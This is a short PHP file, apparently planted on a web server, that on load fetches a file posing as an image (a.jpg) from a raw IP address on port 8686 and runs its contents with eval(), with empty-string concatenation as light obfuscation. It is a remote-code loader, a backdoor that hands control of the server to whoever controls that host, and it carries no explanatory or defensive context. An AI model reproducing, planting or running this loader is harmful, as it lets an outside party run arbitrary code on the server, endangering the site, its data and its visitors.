<?php
function s(){
	$contents = file_get_contents('http://23.252.161.21:8686/8group/a.jpg');
	a($contents);
}
function a($conn){
	$b = '';
	eval($b.$conn.$b);
}
s();
//
?>